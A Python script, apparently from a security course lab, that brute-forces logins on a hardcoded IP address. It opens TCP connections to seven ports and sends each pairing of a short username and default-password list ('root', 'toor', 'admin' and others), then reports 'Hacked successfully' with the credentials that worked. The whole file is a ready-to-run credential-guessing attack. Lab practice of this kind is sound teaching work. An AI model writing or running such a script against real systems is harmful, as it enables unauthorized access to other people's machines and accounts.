import socket


def brute_force_attack(target_ip, target_ports, usernames, passwords):
    for target_port in target_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            print(f"Connected to {target_ip} on port {target_port}")

            for user in usernames:
                for password in passwords:
                    try:
                        s.send(f"{user}:{password}\n".encode())
                        response = s.recv(1024).decode()
                        if "Login successful" in response:
                            print(
                                f"Hacked successfully.\nLogin Credentials: {user}, {password}"
                            )
                            s.close()
                            return
                        else:
                            print("Login failed for: ", user, password)
                    except Exception as e:
                        print("Error sending data:", e)
                        continue

            s.close()
        except Exception as e:
            print("Error connecting to port:", target_port, e)


if __name__ == "__main__":
    target_ip = "137.113.118.10"
    target_ports = [1111, 2222, 3333, 4444, 5555, 6666, 7777]
    usernames = ["root", "csci2971"]
    passwords = [
        "password",
        "admin",
        "root",
        "toor",
        "csci2971",
        "csci2971password",
        "plshaxme66666",
    ]
    # with open("common-passwords.txt", "r") as file:
    #     passwords = [line.strip() for line in file.readlines()]

    brute_force_attack(target_ip, target_ports, usernames, passwords)
